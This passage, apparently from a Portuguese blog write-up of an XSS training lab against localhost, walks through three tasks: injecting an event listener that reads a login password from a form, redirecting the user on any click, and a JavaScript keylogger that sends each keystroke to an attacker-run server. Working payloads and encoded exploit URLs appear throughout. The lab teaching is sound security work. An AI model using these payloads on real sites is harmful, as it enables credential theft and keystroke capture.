Conforme explorado anteriormente, os *event listeners* são funções chamadas em resposta a um evento específico que ocorre em um elemento. Existem uma infinidade de *event listeners* que podem ser utilizados em vários contextos diferentes.

#### Exploração

A primeira coisa a se observar, é que após enviar uma requisição de *login*, duas coisas acontecem:

1. A URL é preenchida com os dados do formulário (algo inconcebível no que diz respeito a segurança, mas considere um exemplo).
2. O campo `email` do formulário fica com ser `value` preenchido com o e-mail informado.

![Campo preenchido](/img/posts/2023-06-21-beyond-the-alert-19.png)

Isso significa que, se o campo e-mail não tiver um tratamento de entrada, é possível preenchê-lo com aspas, para sair do contexto `value` e a partir daí entrar nas propriedades do campo `input`.

Por exemplo, se pegarmos a seguinte *string*:

```
" teste="h41stur
```

Encodá-lo em URL encode:

```
%22%20teste%3D%22h41stur
```

E injetá-lo na URL no parâmetro `email` com a seguinte URL:

- [http://localhost/07/?email=%22%20teste%3D%22h41stur&password=](http://localhost/07/?email=%22%20teste%3D%22h41stur&password=)

Ao checarmos o código HTML da página, veremos que saímos do escopo `value` e criamos uma nova propriedade.

![Contexto alterado](/img/posts/2023-06-21-beyond-the-alert-20.png)

Sabendo desta falha, podemos criar um *event listener* dentro de um *event handler attribute* para ser injetado no elemento `input` da seguinte forma:

```javascript
" onmouseover="
	document.forms[0].onsubmit = function demo () {
		var pass = document.forms[0].elements[1].value;
		alert(pass);
	}
```

Convertendo para *URL Encode*:

```
%22%20onmouseover%3D%22%0A%09document.forms%5B0%5D.onsubmit%20%3D%20function%20demo%20%28%29%20%7B%0A%09%09var%20pass%20%3D%20document.forms%5B0%5D.elements%5B1%5D.value%3B%0A%09%09alert%28pass%29%3B%0A%09%7D
```

Gerando a seguinte URL:

- [http://localhost/07/?email=%22%20onmouseover%3D%22%0A%09document.forms%5B0%5D.onsubmit%20%3D%20function%20demo%20%28%29%20%7B%0A%09%09var%20pass%20%3D%20document.forms%5B0%5D.elements%5B1%5D.value%3B%0A%09%09alert%28pass%29%3B%0A%09%7D&password=](http://localhost/07/?email=%22%20onmouseover%3D%22%0A%09document.forms%5B0%5D.onsubmit%20%3D%20function%20demo%20%28%29%20%7B%0A%09%09var%20pass%20%3D%20document.forms%5B0%5D.elements%5B1%5D.value%3B%0A%09%09alert%28pass%29%3B%0A%09%7D&password=)

Com isso, o código HTML foi alterado e o script injetado no *event listener*.

![Event listener](/img/posts/2023-06-21-beyond-the-alert-21.png)

Desta forma, quando o usuário submeter o formulário com usuário e senha, o alerta será impresso com a senha.

![Resultado](/img/posts/2023-06-21-beyond-the-alert-22.png)

#### Referências

- [https://aws.amazon.com/pt/what-is/event-listener/](https://aws.amazon.com/pt/what-is/event-listener/)
- [https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes#event_handler_attributes](https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes#event_handler_attributes)

### *Task 8 - Redirect on Click*

![Task 8](/img/posts/2023-06-21-beyond-the-alert-23.png)

#### Objetivo

O objetivo desta *task* é redirecionar o usuário para qualquer outro lugar, sempre que ele efetuar qualquer clique dentro da página.

#### *Background*

Conforme explorado anteriormente, os *event listeners* são funções chamadas em resposta a um evento específico que ocorre em um elemento. Existem uma infinidade de *event listeners* que podem ser utilizados em vários contextos diferentes.

Com uso de JavaScript, é possível criar *event listeners* atrelados a qualquer elemento HTML com o método `addEventListener()`.

#### Exploração

É possível criar uma função de redirecionamento, e atrelar um *event listener*  ao próprio `body` do documento.

```html
<script>
	function CaughtClick() {
		window.location = "https://h41stur.com";
	}
	document.body.addEventListener('click', CaughtClick, true);
</script>
```

Convertendo para *URL Encode*:

```
%3Cscript%3E%0A%09function%20CaughtClick%28%29%20%7B%0A%09%09window.location%20%3D%20%22https%3A%2F%2Fh41stur.com%22%3B%0A%09%7D%0A%09document.body.addEventListener%28%27click%27%2C%20CaughtClick%2C%20true%29%3B%0A%3C%2Fscript%3E
```

Gerando a seguinte URL:

- [http://localhost/08/?search=%3Cscript%3E%0A%09function%20CaughtClick%28%29%20%7B%0A%09%09window.location%20%3D%20%22https%3A%2F%2Fh41stur.com%22%3B%0A%09%7D%0A%09document.body.addEventListener%28%27click%27%2C%20CaughtClick%2C%20true%29%3B%0A%3C%2Fscript%3E](http://localhost/08/?search=%3Cscript%3E%0A%09function%20CaughtClick%28%29%20%7B%0A%09%09window.location%20%3D%20%22https%3A%2F%2Fh41stur.com%22%3B%0A%09%7D%0A%09document.body.addEventListener%28%27click%27%2C%20CaughtClick%2C%20true%29%3B%0A%3C%2Fscript%3E)


Ao acessar a URL, qualquer clique dentro da página levará ao redirecionamento.

#### Referências

- [https://developer.mozilla.org/en-US/docs/Web/API/EventTarget/addEventListener](https://developer.mozilla.org/en-US/docs/Web/API/EventTarget/addEventListener)
### *Task 9 - JavaScript Keylogger*

![Task 9](/img/posts/2023-06-21-beyond-the-alert-24.png)

#### Objetivo

O objetivo desta *task* é criar um *key logger* que irá capturar todas as teclas digitadas por um invasor dentro da página, e enviá-las para a máquina sob controle do atacante.

#### *Background*

Os atributos globais de manipulador de evento (*event handler*) em HTML são atributos que podem ser adicionados a qualquer elemento HTML para definir o comportamento de um elemento quando um evento específico ocorre. Por exemplo, você pode usar um manipulador de eventos para definir o que acontece quando um usuário clica em um elemento, passa o mouse sobre um elemento, pressiona uma tecla do teclado quando um elemento tem foco, e muito mais.

Alguns exemplos de manipuladores de eventos globais são:

- `onkeypress`: Este manipulador é acionado quando um usuário pressiona uma tecla e depois a solta.
- `onclick`: Este manipulador é acionado quando um usuário clica em um elemento.
- `ondblclick`: Este manipulador é acionado quando um usuário clica duas vezes em um elemento.
- `onmouseover`: Este manipulador é acionado quando um usuário move o cursor do mouse sobre um elemento.
- `onmouseout`: Este manipulador é acionado quando um usuário move o cursor do mouse para fora de um elemento.
- `onkeydown`: Este manipulador é acionado quando um usuário pressiona uma tecla do teclado.
- `onload`: Este manipulador é acionado quando um elemento, como uma imagem ou um script, terminou de carregar.

Cada um desses manipuladores de eventos pode ser usado para chamar uma função JavaScript que define o que acontece quando o evento ocorre.

A única diferença entre um atributo *event handler* e um *event listener* é que os *event handlers* são uma maneira mais antiga e menos flexível de responder a eventos, pois são inseridos de forma estática diretamente no HTML, enquanto os *event listeners* oferecem mais controle e permitem múltiplas funções de *callback* para o mesmo evento no mesmo elemento. 

Eventos que capturam teclas pressionadas, geralmente armazenam este *buffer* em **UTF-16**, para que estes caracteres sejam transformados em uma *string*, pode-se utilizar o método estático `String.fromCharCode()`.

#### Exploração

Para montar este ataque, podemos utilizar o *event handler* `onkeypress` para enviar a tecla pressionada para uma função, que por sua vez vai transformar em uma *string* e enviar via requisição utilizando o *constructor* `Image()` para a máquina sob controle do atacante.

```html
<script>
	document.onkeypress = function KeyLogger(inp) {
		key_pressed = String.fromCharCode(inp.which);
		new Image().src = "http://0.0.0.0:8080/?"+key_pressed;
	}
</script>
```

Convertendo para *URL Encode*:

```
%3Cscript%3E%0A%09document.onkeypress%20%3D%20function%20KeyLogger%28inp%29%20%7B%0A%09%09key_pressed%20%3D%20String.fromCharCode%28inp.which%29%3B%0A%09%09new%20Image%28%29.src%20%3D%20%22http%3A%2F%2F0.0.0.0%3A8080%2F%3F%22%2Bkey_pressed%3B%0A%09%7D%0A%3C%2Fscript%3E
```

Gerando a seguinte URL:

- [http://localhost/09/?search=%3Cscript%3E%0A%09document.onkeypress%20%3D%20function%20KeyLogger%28inp%29%20%7B%0A%09%09key_pressed%20%3D%20String.fromCharCode%28inp.which%29%3B%0A%09%09new%20Image%28%29.src%20%3D%20%22http%3A%2F%2F0.0.0.0%3A8080%2F%3F%22%2Bkey_pressed%3B%0A%09%7D%0A%3C%2Fscript%3E](http://localhost/09/?search=%3Cscript%3E%0A%09document.onkeypress%20%3D%20function%20KeyLogger%28inp%29%20%7B%0A%09%09key_pressed%20%3D%20String.fromCharCode%28inp.which%29%3B%0A%09%09new%20Image%28%29.src%20%3D%20%22http%3A%2F%2F0.0.0.0%3A8080%2F%3F%22%2Bkey_pressed%3B%0A%09%7D%0A%3C%2Fscript%3E)

Podemos iniciar um *Python server* na porta 8080 configurada para ouvir a requisição feita.

![Servidor Python ouvindo](/img/posts/2023-06-21-beyond-the-alert-13.png)

Ao acessar a página, nenhuma alteração é visível, porém, ao preencher os campos de usuário e senha, a cada tecla pressionada, uma requisição será feita para *Python server* contendo seu valor.


![Resultado](/img/posts/2023-06-21-beyond-the-alert-25.png)


#### Referências

- [https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes#event_handler_attributes](https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes#event_handler_attributes)
- [https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/fromCharCode](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/fromCharCode)

